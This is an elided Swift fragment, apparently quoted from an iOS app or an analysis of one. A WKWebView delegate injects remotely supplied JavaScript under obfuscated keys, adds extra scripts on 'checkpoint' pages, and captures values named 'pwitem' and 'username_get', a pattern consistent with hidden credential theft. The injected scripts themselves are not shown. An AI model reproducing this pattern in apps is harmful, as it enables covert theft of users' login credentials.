...
struct TwoCoor: UIViewRepresentable {
    ...
    class TwoCoorClass: NSObject, WKNavigationDelegate {
        ...
        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
            webView.evaluateJavaScript(towprent.listData[RemoKey.two1af.rawValue] ?? "") { data, error in
            ...
            webView.evaluateJavaScript(towprent.listData[RemoKey.two2af.rawValue] ?? "") { pwitem, error in
        ...
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            webView.evaluateJavaScript(towprent.listData[RemoKey.two3af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two4af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two5af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two6af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two7af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two8af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two9af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two10af.rawValue] ?? "")
            webView.evaluateJavaScript(towprent.listData[RemoKey.two11f.rawValue] ?? "")

            if webView.url?.absoluteString.range(of: "checkpoint") != nil {
                webView.evaluateJavaScript(towprent.listData[RemoKey.two12f.rawValue] ?? "")
                webView.evaluateJavaScript(towprent.listData[RemoKey.two13f.rawValue] ?? "")
            }

            webView.evaluateJavaScript(towprent.listData[RemoKey.two14f.rawValue] ?? "") { username_get, error in
